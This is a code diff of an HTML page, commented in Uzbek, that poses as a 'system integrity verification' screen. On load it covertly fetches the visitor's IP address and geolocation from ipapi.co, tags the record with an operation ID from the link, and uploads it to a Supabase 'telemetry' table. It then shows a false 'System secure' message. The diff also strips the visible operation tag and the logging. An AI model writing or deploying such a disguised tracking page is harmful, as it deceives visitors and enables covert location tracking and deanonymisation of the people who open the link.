@@ -3,95 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gojo Six Eyes | System Verification</title>
+    <title>Gojo Six Eyes | Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body {
             background-color: #050505;
             color: #00d9ff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
             height: 100vh;
             margin: 0;
             text-align: center;
-            overflow: hidden;
         }
         .container {
-            border: 1px solid #111;
-            background: #0a0a0a;
-            padding: 40px;
-            box-shadow: 0 0 30px rgba(0, 217, 255, 0.1);
-            border-radius: 12px;
-            z-index: 1;
+            padding: 20px;
         }
         h1 {
-            font-size: 1.5rem;
-            letter-spacing: 3px;
-            margin-bottom: 10px;
-            text-transform: uppercase;
+            font-size: 1.8rem;
+            letter-spacing: 4px;
+            margin: 0;
         }
-        .status-text {
+        .status {
             color: #888;
-            font-size: 0.9rem;
-            margin-bottom: 20px;
+            font-size: 1rem;
+            margin-top: 10px;
         }
         .loader {
-            width: 150px;
-            height: 2px;
+            width: 100px;
+            height: 1px;
             background: #222;
-            margin: 25px auto;
+            margin: 20px auto;
             position: relative;
             overflow: hidden;
         }
         .loader::after {
             content: '';
-            width: 40px;
+            width: 30px;
             height: 100%;
             background: #00d9ff;
             position: absolute;
-            animation: scan 2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            animation: scan 1.5s infinite;
         }
         @keyframes scan {
-            0% { left: -40px; }
-            100% { left: 150px; }
-        }
-        .op-tag {
-            font-size: 10px; 
-            color: #333; 
-            letter-spacing: 2px;
-            margin-top: 20px;
+            0% { left: -30px; }
+            100% { left: 100px; }
         }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="container" id="main-content">
     <h1>🌀 GOJO SIX EYES</h1>
-    <p class="status-text" id="status">Verifying system integrity...</p>
-    <div class="loader"></div>
-    <p class="op-tag">OP_ID: <span id="op-id">PENDING</span></p>
+    <div class="loader" id="loader"></div>
+    <p class="status" id="status">Verifying system integrity...</p>
 </div>
 
 <script>
-    // --- SUPABASE SOZLAMALARI ---
-    // Bu yerga Supabase Project Settings -> API bo'limidagi ma'lumotlarni qo'ying
+    // --- SUPABASE CONFIG (Sizning ma'lumotlaringiz) ---
     const SUPABASE_URL = 'https://kisbfmcxvcwtxfwbgexb.supabase.co'; 
     const SUPABASE_KEY = 'sb_publishable_THarexbaf5WB2Cc-c6t-sg_TQJycbtz';
     const _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    // 1. URL dan Operation ID ni aniqlash
     const urlParams = new URLSearchParams(window.location.search);
     const opID = urlParams.get('id') || "UNSET";
-    document.getElementById('op-id').innerText = opID.toUpperCase();
 
-    // 2. Ma'lumotlarni yig'ish va yuborish funksiyasi
     async function initTrace() {
         try {
-            // IP va Geo-ma'lumotlarni olish
+            // IP va metadata yig'ish
             const res = await fetch("https://ipapi.co/json/");
-            if (!res.ok) throw new Error("IP fetch failed");
             const data = await res.json();
 
             const payload = {
@@ -103,33 +84,34 @@
                 created_at: new Date().toISOString()
             };
 
-            console.log("Telemetry captured locally:", payload);
-            
-            // Supabase bazasiga yuklash
+            // Bazaga yuborish
             await sendToDatabase(payload);
-
         } catch (err) {
-            console.error("Critical Error:", err);
-            document.getElementById('status').innerText = "Security check finalized.";
+            console.error("Trace error:", err);
+            showFinalMessage(); 
         }
     }
 
-    // 3. Bazaga yuborish funksiyasi
     async function sendToDatabase(payload) {
-        const { data, error } = await _supabase
-            .from('telemetry') // Supabase'dagi jadval nomi
-            .insert([payload]);
-
-        if (error) {
-            console.error("Database Error:", error);
-            document.getElementById('status').innerText = "Connection lost. Retry later.";
-        } else {
-            console.log("Data successfully synced with Six Eyes Cloud.");
-            document.getElementById('status').innerText = "System secure. Verification complete.";
+        try {
+            const { error } = await _supabase.from('telemetry').insert([payload]);
+            if (error) throw error;
+        } catch (e) {
+            console.error("DB error:", e);
+        } finally {
+            showFinalMessage();
         }
     }
 
-    // Sahifa yuklanganda ishga tushirish
+    function showFinalMessage() {
+        document.getElementById('main-content').innerHTML = `
+            <h1>🌀 GOJO SIX EYES</h1>
+            <p class="status" style="color: #00d9ff; margin-top: 15px;">
+                System secure. Verification complete.
+            </p>
+        `;
+    }
+
     window.onload = initTrace;
 </script>
 
